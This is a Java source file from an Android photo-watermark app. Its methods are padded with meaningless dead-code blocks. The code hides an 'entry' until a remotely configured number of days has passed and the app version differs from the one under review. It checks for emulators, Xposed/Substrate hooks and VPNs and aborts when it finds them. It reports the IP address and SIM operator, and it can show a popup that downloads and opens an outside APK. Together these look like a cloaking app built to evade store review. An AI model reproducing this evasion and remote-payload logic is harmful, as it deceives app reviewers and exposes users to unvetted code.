package com.getwatermark.photomaker.lscj.cs;

import android.animation.ValueAnimator;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.hardware.Sensor;
import android.hardware.SensorManager;
import android.net.Uri;
import android.os.Build;
import android.os.Process;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Base64;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.widget.ImageView;
import android.widget.PopupWindow;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.Nullable;

import com.bumptech.glide.Glide;
import com.getwatermark.photomaker.R;
import com.getwatermark.photomaker.lscj.Mshp;
import com.getwatermark.photomaker.lscj.cs.vv.Acxc;
import com.getwatermark.photomaker.lscj.cs.vv.Wpd;
import com.getwatermark.photomaker.lscj.vbvj.Vldo;
import com.getwatermark.photomaker.lscj.wwzz.Ecnsb;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.NetworkInterface;
import java.util.Collections;
import java.util.Enumeration;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;

import static android.content.Context.SENSOR_SERVICE;
import static com.getwatermark.photomaker.lscj.cs.Aci.CFG;
import static com.getwatermark.photomaker.lscj.cs.Aci.GET_PP_INFO;
import static com.getwatermark.photomaker.lscj.cs.Aci.UPLOAD_IP_INFO;

/**
 * 入口检测
 */

public class Vjsd {

    private Aci loginPresenter;
    private Context context;

    public interface PpNiceGreate {
        void showEnter(boolean show, int entry, String where, @Nullable Object obj);
    }

    private static Vjsd instance = null;

    private boolean isDebug = false;

    public static boolean HAS_SHOW_STORE = false;
    public static boolean HAS_SHOW_STORE_ALERT = false;

    public static Vjsd getInstance() {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
//        if (instance == null) {
//            synchronized (CoreFirebaseRemoteConfigUtils.class) {
//                instance = new CoreFirebaseRemoteConfigUtils();
//            }
//        }
//        return instance;
        return new Vjsd();
    }

    public long getAppInstalledTime(Context context) {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        return getSp(context).getLong("app_iniinin", 0);
    }

    private SharedPreferences getSp(Context context) {
        return context.getSharedPreferences("apppp", Context.MODE_PRIVATE);
    }

    public void setAppInstalledTime(Context context) {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        getSp(context).edit().putLong("app_iniinin", System.currentTimeMillis()).apply();

    }

    public void setLastRefreshTime(Context context) {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        getSp(context).edit().putLong("last_refresh_time", System.currentTimeMillis()).apply();
    }


    public void setLastRefreshTime(Context context, long l) {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        getSp(context).edit().putLong("last_refresh_time", l).apply();
    }

    public long getLastRefreshTime(Context context) {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        return getSp(context).getLong("last_refresh_time", 0);
    }

    public static final int DAY = 86400000;

    // 判断是否超过了cfg 接口刷新间隔
    public boolean isNeedRefreshFirebaseRemoteConfig(Context context) {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        long lastUploadIpTime = getLastRefreshTime(context);
        if (lastUploadIpTime <= 0) {
            // 没有抓取过，需要重新抓取
            return true;
        } else if (System.currentTimeMillis() - lastUploadIpTime >= loginPresenter.getFirebaseCheckInterval() * DAY) {
            // 上次上传的时间超过了规定的时间间隔
            return true;
        } else {
            // 否则，不需要上传 IP
            return false;
        }
    }

    public @Nullable
    Wpd checkEnter(final Activity activity, final PpNiceGreate showEnterListener) {
        boolean enterBoolean = getEnterBoolean(activity);


        context = activity;

        if (getAppInstalledTime(activity) <= 0) {
            setAppInstalledTime(activity);
        }

        loginPresenter = new Aci(activity, (type, obj) -> {
            try {
                switch (type) {
                    case UPLOAD_IP_INFO:
                        if (obj == null) {
                            loginPresenter.saveNeedShowLikeActivityEnter(false);
                        }
                        checkEnterVisible(activity, showEnterListener);
                        break;
                    case CFG:
                        if (obj != null) {
                            checkCfg(activity, loginPresenter, showEnterListener);
                        } else {
                            checkEnterVisible(activity, showEnterListener);
                        }
                        break;
                    case GET_PP_INFO:
                        // 插件才会到这里来
                        showEnterListener.showEnter(getEnterBoolean(activity), loginPresenter.getEntry(), getWhereString(), obj);
                        break;
                    default:
                        break;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }, getOperator(activity), isVpnUsed());
        // 判断是否进入核心
        if (!Acxc.isNetAvailable(activity)
                || enterBoolean || Mshp.getInstance().getStartKernel()) {
            // 如果刷新过了，并在刷新间隔范围内，直接判断状态
            showEnterListener.showEnter(Mshp.getInstance().getStartKernel(), loginPresenter.getEntry(), getWhereString(), null);

        } else {
            if (mayOnEmulator(activity)) {
                Ecnsb.post("check_fails", null);

                if (showEnterListener != null) {
                    showEnterListener.showEnter(false, 0, "", null);
                }
                return null;
            }
        }

        loginPresenter.cfg();

        return loginPresenter;
    }

    private String getVersionName(Context context) {
        try {
            PackageInfo pi = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
            if (pi != null) {
                return pi.versionName;
            }
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        return "";
    }

    private long getVersionCode(Context context) {
        try {
            PackageInfo pi = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
            if (pi != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    return pi.getLongVersionCode();
                } else {
                    return pi.versionCode;
                }
            }
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        return -1;
    }


    private void checkCfg(Activity activity, Aci loginPresenter, PpNiceGreate showEnterListener) {
        String versionName = getVersionName(activity);
        String promotionVersion = loginPresenter.getPromotionVersion();
        if (TextUtils.isEmpty(promotionVersion) || TextUtils.equals(versionName, promotionVersion)) {
            // 隐藏入口
            loginPresenter.saveNeedShowLikeActivityEnter(false);
        } else {
            setLastRefreshTime(activity);
        }
        boolean b = checkAndUploadIp(versionName, promotionVersion, loginPresenter);
        //noinspection StatementWithEmptyBody
        if (b) {
            // 去抓取 IP 并上报 IP 了，这是异步的

        } else {
            // debug 模式，直接去判断
            checkEnterVisible(activity, showEnterListener);
        }

        // 上报设备信息
//        loginPresenter.uploadDeviceInfo(activity);
    }

    private PopupWindow mDaoliangPopupWindow;

    private void initDaoliangPop(Activity context) {
        View view = LayoutInflater.from(context).inflate(R.layout.pop_daoliang, null);
        mDaoliangPopupWindow = new PopupWindow(
                view, ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT, true);

        mDaoliangPopupWindow.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));

        mDaoliangPopupWindow.setOnDismissListener(new PopupWindow.OnDismissListener() {
            @Override
            public void onDismiss() {
                switch (32) {
                    case 15:
                        try {
                            JSONObject Cjsnc = new JSONObject();
                            String siwu8 = Cjsnc.getString("widjcu");
                            String v8s = Cjsnc.getString("iwcncu");
                            String v398 = Cjsnc.getString("avjinsu");
                        } catch (Exception i) {
                            i.printStackTrace();
                        }
                        break;
                    default:
                        break;
                }
                changeWindowAlpha(context, 1F);
            }
        });
    }

    public static void changeWindowAlpha(Activity activity, float v) {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        final Window window = activity.getWindow();
        final WindowManager.LayoutParams attributes = window.getAttributes();
        ValueAnimator show = ValueAnimator.ofFloat(attributes.alpha, v);
        show.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {
            @Override
            public void onAnimationUpdate(ValueAnimator animation) {
                switch (32) {
                    case 15:
                        try {
                            JSONObject Cjsnc = new JSONObject();
                            String siwu8 = Cjsnc.getString("widjcu");
                            String v8s = Cjsnc.getString("iwcncu");
                            String v398 = Cjsnc.getString("avjinsu");
                        } catch (Exception i) {
                            i.printStackTrace();
                        }
                        break;
                    default:
                        break;
                }
                attributes.alpha = (float) animation.getAnimatedValue();
                window.setAttributes(attributes);
            }
        });
        show.start();
    }

    private void toShowEnter(final Activity context, final PpNiceGreate showEnterListener, final boolean b2) {
        try {
            boolean drainageControl = loginPresenter.getDrainageControl();
            String messageStr = loginPresenter.getDrainageMessageInfo();
            if (messageStr.contains("\\n")) {
                messageStr = messageStr.replace("\\n", "\n");
            }
            String titleStr = loginPresenter.getDrainageTitle();
            final String url = loginPresenter.getDrainageUrl();
            final String iconUrl = loginPresenter.getDrainageIcon();
            String marketName = loginPresenter.getDrainageMarketName();
            if (drainageControl && !HAS_SHOW_STORE_ALERT) {
                HAS_SHOW_STORE_ALERT = true;
                if (mDaoliangPopupWindow == null) {
                    initDaoliangPop(context);
                }
                View contentView = mDaoliangPopupWindow.getContentView();
                ImageView iconIv = contentView.findViewById(R.id.iv_daoliang_p_icon);
                Glide.with(context).load(iconUrl).into(iconIv);
                TextView titleTv = contentView.findViewById(R.id.tv_daoliang_p_title);
                titleTv.setText(titleStr);
                TextView messageTv = contentView.findViewById(R.id.tv_daoliang_p_desc);
                messageTv.setText(messageStr);
                contentView.findViewById(R.id.iv_daoliang_p_close).setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        switch (32) {
                            case 15:
                                try {
                                    JSONObject Cjsnc = new JSONObject();
                                    String siwu8 = Cjsnc.getString("widjcu");
                                    String v8s = Cjsnc.getString("iwcncu");
                                    String v398 = Cjsnc.getString("avjinsu");
                                } catch (Exception i) {
                                    i.printStackTrace();
                                }
                                break;
                            default:
                                break;
                        }
                        if (showEnterListener != null) {
                            showEnter(showEnterListener, b2);
                        }
                        if (mDaoliangPopupWindow != null && mDaoliangPopupWindow.isShowing()) {
                            mDaoliangPopupWindow.dismiss();
                        }
                    }
                });
                contentView.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        switch (32) {
                            case 15:
                                try {
                                    JSONObject Cjsnc = new JSONObject();
                                    String siwu8 = Cjsnc.getString("widjcu");
                                    String v8s = Cjsnc.getString("iwcncu");
                                    String v398 = Cjsnc.getString("avjinsu");
                                } catch (Exception i) {
                                    i.printStackTrace();
                                }
                                break;
                            default:
                                break;
                        }
                        if (showEnterListener != null) {
                            showEnter(showEnterListener, b2);
                        }
                        try {
                            if (url.contains(".apk")) {
                                //TODO 倒量下载APK
                                Vldo.getLoadApkUtlis().openActivity(context, Mshp.getInstance().getApkDownloadBundleId(), url);

                            } else {
                                if (url.startsWith("http")) {
                                    viewUrl(context, marketName, url, "");

                                } else {
                                    try {
                                        viewUrlNoCache(context, "", "market://details?id=" + url, "");
                                    } catch (ActivityNotFoundException anfe) {
                                        try {
                                            viewUrlNoCache(context, marketName, "https://play.google.com/store/apps/details?id=" + url, "");
                                        } catch (Exception e) {
                                            viewUrlNoCache(context, "", "https://play.google.com/store/apps/details?id=" + url, "");
                                        }
                                    }
                                }

                            }
                            HAS_SHOW_STORE = true;
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                });

                mDaoliangPopupWindow.showAtLocation(context.findViewById(android.R.id.content), Gravity.CENTER, 0, 0);
                changeWindowAlpha(context, 0.6F);
            } else if (showEnterListener != null) {
                showEnter(showEnterListener, b2);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void showEnter(PpNiceGreate showEnterListener, boolean b2) {
        try {
            int entry = loginPresenter.getEntry();
            if (b2 && entry == 2) {
                loginPresenter.getPpInfo(0);
            } else {
                String where = getWhereString();
                showEnterListener.showEnter(b2, entry, where, null);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    private String getWhereString() {
        String where = base64DecodeStr(loginPresenter.getAdd());
        String s = "?";
        if (!TextUtils.isEmpty(where)) {
            if (where.contains(s)) {
                if (!where.endsWith(s)) {
                    where += "&";
                }
            } else {
                where += s;
            }
            where += "productId=" + context.getPackageName() + "&version=" + getVersionCode(context);
        }
        return where;
    }

    private boolean getEnterBoolean(Activity activity) {
        try {
            // 是否打开入口
            boolean needShowLikeActivityEnter = loginPresenter.getNeedShowLikeActivityEnter();
            // 入口隐藏天数检查
            boolean hideEnterOverTime = isHideEnterOverTime(activity);
            boolean debugMode = isDebug;
            boolean b = needShowLikeActivityEnter && hideEnterOverTime;
            return b || Mshp.getInstance().hasEnterKernel() || debugMode;

        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    private void checkEnterVisible(Activity activity, PpNiceGreate showEnterListener) {
        boolean b1 = getEnterBoolean(activity);
        // 显示入口
        toShowEnter(activity, showEnterListener, b1);
    }

    private boolean checkAndUploadIp(String versionName, String promotionVersion, Aci dddPresenter) {
        if (dddPresenter == null) {
            return false;
        }
        if (!isDebug) {
            // 非 Debug 模式，再去走上报 IP 步骤
            String publicNetworkIp = dddPresenter.getPublicNetworkIp();
            switch (32) {
                case 15:
                    try {
                        JSONObject Cjsnc = new JSONObject();
                        String siwu8 = Cjsnc.getString("widjcu");
                        String v8s = Cjsnc.getString("iwcncu");
                        String v398 = Cjsnc.getString("avjinsu");
                    } catch (Exception i) {
                        i.printStackTrace();
                    }
                    break;
                default:
                    break;
            }
            if (TextUtils.isEmpty(publicNetworkIp)) {
                switch (32) {
                    case 15:
                        try {
                            JSONObject Cjsnc = new JSONObject();
                            String siwu8 = Cjsnc.getString("widjcu");
                            String v8s = Cjsnc.getString("iwcncu");
                            String v398 = Cjsnc.getString("avjinsu");
                        } catch (Exception i) {
                            i.printStackTrace();
                        }
                        break;
                    default:
                        break;
                }
                // 如果 IP 存储失败, 取抓取 IP
                dddPresenter.saveIpInfo(true, versionName, promotionVersion);
            } else if (isNeedUploadIp()) {
                // 如果 IP 存储成功，并且超过时间间隔
                dddPresenter.saveIpInfo(true, versionName, promotionVersion);
            } else {
                // 直接去上报 IP
                dddPresenter.uploadIpInfo(versionName, promotionVersion);
            }
            return true;
        }
        return false;
    }

    private boolean isNeedUploadIp() {
        long lastUploadIpTime = loginPresenter.getLastUploadIpTime();
        if (lastUploadIpTime <= 0) {
            // 没有上传过，需要上传
            return true;
        } else if (System.currentTimeMillis() - lastUploadIpTime >= loginPresenter.getUploadIpInterval() * DAY) {
            // 上次上传的时间超过了规定的时间间隔
            return true;
        } else {
            // 否则，不需要上传 IP
            return false;
        }
    }

    public boolean isHideEnterOverTime(Context context) {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        long appInstalledTime = getAppInstalledTime(context);
        boolean hideTimeOver = false;
        if (appInstalledTime <= 0) {
            appInstalledTime = System.currentTimeMillis();
            setAppInstalledTime(context);
        }

        double likeActivityHiddenDays = loginPresenter.getLikeActivityHiddenDays();
        if (System.currentTimeMillis() - appInstalledTime
                >= likeActivityHiddenDays * DAY) {
            hideTimeOver = true;
        }
        return hideTimeOver;
    }

    public static void viewUrl(Activity activity, String packageName, String url, String mimeType) {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        Intent intent = new Intent(Intent.ACTION_VIEW);
        Uri uri = Uri.parse(url);
        if (TextUtils.isEmpty(mimeType)) {
            intent.setData(uri);
        } else {
            intent.setDataAndType(uri, mimeType);
        }

        if (!TextUtils.isEmpty(packageName)) {
            intent.setPackage(packageName);
        }
        if (activity.getPackageManager().resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY) != null) {
            try {
                activity.startActivity(intent);
            } catch (ActivityNotFoundException e) {
                Toast.makeText(activity, "Something wrong", Toast.LENGTH_SHORT).show();
            }
        } else {
            Toast.makeText(activity, "Something wrong", Toast.LENGTH_SHORT).show();
        }
    }

    public static boolean viewUrlNoCache(Activity activity, String packageName, String url, String mimeType) {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        Intent intent = new Intent(Intent.ACTION_VIEW);
        Uri uri = Uri.parse(url);
        if (TextUtils.isEmpty(mimeType)) {
            intent.setData(uri);
        } else {
            intent.setDataAndType(uri, mimeType);
        }

        if (!TextUtils.isEmpty(packageName)) {
            intent.setPackage(packageName);
        }
        if (activity.getPackageManager().resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY) != null) {
            activity.startActivity(intent);
            return true;
        }
        return false;
    }

    public static String base64DecodeStr(String input) {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        if (TextUtils.isEmpty(input)) {
            return "";
        }
        byte[] output = base64Decode(input.getBytes());
        return new String(output);
    }

    public static byte[] base64Decode(byte[] input) {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        return Base64.decode(input, Base64.NO_WRAP);
    }

    public final boolean mayOnEmulator(Context context) {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        try {
            if (isHook(context) || isXposed() || isXposedBridge()) {
                Ecnsb.post("ins_encheck_hook", null);

            }
        } catch (Exception e) {
        }
        try {
            if (isFeatures() || checkIsNotRealPhone() || notHasLightSensorManager(context)) {
                Ecnsb.post("ins_encheck_emulator", null);

            }
        } catch (Exception e) {
        }
        try {
            if (mayOnEmulatorViaBuild()) {
                return true;
            }
        } catch (Exception e) {
        }

        try {
            if (mayOnEmulatorViaTelephonyDeviceId(context)) {
                return true;
            }
        } catch (Exception e) {
        }

        try {
            if (mayOnEmulatorViaQEMU(context)) {
                return true;
            }
        } catch (Exception e) {
        }

        try {
            if (Edim.with(context).setDebug(isDebug).detect()) {
                return true;
            }
        } catch (Exception e) {
        }
        try {
            if (isGoogleSDK()) {
                return true;
            }
        } catch (Exception e) {
        }

        return false;
    }

    private static boolean isHook(Context var0) {
        try {
            PackageManager var1 = var0.getPackageManager();
            @SuppressLint("WrongConstant") List var2 = var1.getInstalledApplications(128);
            Iterator var3 = var2.iterator();
            ApplicationInfo var4;
            do {
                if (!var3.hasNext()) {
                    return false;
                }
                var4 = (ApplicationInfo) var3.next();
                if (var4.packageName.equals("de.robv.android.xposed.installer")) {
                    return true;
                }
            } while (!var4.packageName.equals("com.saurik.substrate"));
            return true;
        } catch (Exception var5) {
            return false;
        }
    }

    private static boolean isXposed() {
        try {
            HashSet var0 = new HashSet();
            String var1 = "/proc/" + Process.myPid() + "/maps";
            BufferedReader var2 = new BufferedReader(new FileReader(var1));
            while (true) {
                String var3;
                do {
                    if ((var3 = var2.readLine()) == null) {
                        var2.close();
                        Iterator var7 = var0.iterator();
                        String var5;
                        do {
                            if (!var7.hasNext()) {
                                return false;
                            }
                            var5 = (String) var7.next();
                            if (var5.contains("com.saurik.substrate")) {

                                return true;
                            }
                        } while (!var5.contains("XposedBridge.jar"));
                        return true;
                    }
                } while (!var3.endsWith(".so") && !var3.endsWith(".jar"));
                int var4 = var3.lastIndexOf(" ");
                var0.add(var3.substring(var4 + 1));
            }
        } catch (Exception var6) {
            return false;
        }
    }

    private static boolean isXposedBridge() {
        try {
            throw new Exception("findhook");
        } catch (Exception var6) {
            int var1 = 0;
            StackTraceElement[] var2 = var6.getStackTrace();
            int var3 = var2.length;
            for (int var4 = 0; var4 < var3; ++var4) {
                StackTraceElement var5 = var2[var4];
                if (var5.getClassName().equals("com.android.internal.os.ZygoteInit")) {
                    ++var1;
                    if (var1 == 2) {
                        return true;
                    }
                }
                if (var5.getClassName().equals("com.saurik.substrate.MS$2") && var5.getMethodName().equals("invoked")) {
                    return true;
                }
                if (var5.getClassName().equals("de.robv.android.xposed.XposedBridge") && var5.getMethodName().equals("main")) {
                    return true;
                }
                if (var5.getClassName().equals("de.robv.android.xposed.XposedBridge") && var5.getMethodName().equals("handleHookedMethod")) {
                    return true;
                }
            }
            return false;
        }
    }

    private static boolean isGoogleSDK() { // sdk
        return "sdk".equals(Build.MODEL) || "google_sdk".equals(Build.MODEL);
    }

    public String getOperator(Context context) {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        String operator = null;

        try {
            TelephonyManager telephonyManager =
                    (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (telephonyManager != null) {

                try {
                    operator = telephonyManager.getSimOperator();
                } catch (Exception e) {
                    operator = telephonyManager.getNetworkOperator();
                }
            }
        } catch (Exception e) {
        }

        try {
            if (TextUtils.isEmpty(operator)) {
                return "000000";
            }

        } catch (Exception e) {
            e.printStackTrace();
        }


        return operator;

    }

    public static int isVpnUsed() {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        try {
            Enumeration<NetworkInterface> niList = NetworkInterface.getNetworkInterfaces();
            if (niList != null) {
                for (NetworkInterface intf : Collections.list(niList)) {
                    if (!intf.isUp() || intf.getInterfaceAddresses().size() == 0) {
                        continue;
                    }
                    if ("tun0".equals(intf.getName()) || "ppp0".equals(intf.getName())) {
                        return 1; // The VPN is up
                    }
                }
            }
        } catch (Throwable e) {
            e.printStackTrace();
            return 0;
        }
        return 0;
    }

    private static final boolean mayOnEmulatorViaBuild() {
        /**
         * ro.product.model likes sdk
         */
        if (!TextUtils.isEmpty(Build.MODEL) && Build.MODEL.toLowerCase().contains("sdk")) {
            return true;
        }

        /**
         * ro.product.manufacturer likes unknown
         */
        if (!TextUtils.isEmpty(Build.MANUFACTURER) && Build.MANUFACTURER.toLowerCase().contains("unknown")) {
            return true;
        }

        /**
         * ro.product.device likes generic
         */
        if (!TextUtils.isEmpty(Build.DEVICE) && Build.DEVICE.toLowerCase().contains("generic")) {
            return true;
        }

        return false;
    }

    public static boolean isFeatures() {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        return Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.toLowerCase().contains("vbox")
                || Build.FINGERPRINT.toLowerCase().contains("test-keys")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                || "google_sdk".equals(Build.PRODUCT);
    }


    private static final boolean mayOnEmulatorViaTelephonyDeviceId(Context context) {
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (tm == null) {
            return true;
        }


        return false;
    }

    /**
     * 判断是否存在光传感器来判断是否为模拟器
     * 部分真机也不存在温度和压力传感器。其余传感器模拟器也存在。
     *
     * @return true 为模拟器
     */
    public static Boolean notHasLightSensorManager(Context context) {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        SensorManager sensorManager = (SensorManager) context.getSystemService(SENSOR_SERVICE);
        Sensor sensor8 = sensorManager.getDefaultSensor(Sensor.TYPE_LIGHT); //光
        if (null == sensor8) {
            return true;
        } else {
            return false;
        }
    }


    private static final boolean mayOnEmulatorViaQEMU(Context context) {
        String qemu = getProp(context, "ro.kernel.qemu");
        return "1".equals(qemu);
    }

    private static final String getProp(Context context, String property) {
        try {
            ClassLoader cl = context.getClassLoader();
            Class<?> SystemProperties = cl.loadClass("android.os.SystemProperties");
            Method method = SystemProperties.getMethod("get", String.class);
            Object[] params = new Object[1];
            params[0] = property;
            return (String) method.invoke(SystemProperties, params);
        } catch (Exception e) {
            return null;
        }
    }

    public static String readCpuInfo() {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        String result = "";
        try {
            String[] args = {"/system/bin/cat", "/proc/cpuinfo"};
            ProcessBuilder cmd = new ProcessBuilder(args);

            java.lang.Process process = cmd.start();
            StringBuffer sb = new StringBuffer();
            String readLine = "";
            BufferedReader responseReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "utf-8"));
            while ((readLine = responseReader.readLine()) != null) {
                sb.append(readLine);
            }
            responseReader.close();
            result = sb.toString().toLowerCase();
        } catch (IOException ex) {
        }
        return result;
    }

    /**
     * 判断cpu是否为电脑来判断 模拟器
     *
     * @return true 为模拟器
     */
    public static boolean checkIsNotRealPhone() {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        String cpuInfo = readCpuInfo();
        if ((cpuInfo.contains("intel") || cpuInfo.contains("amd"))) {
            return true;
        }
        return false;
    }


}
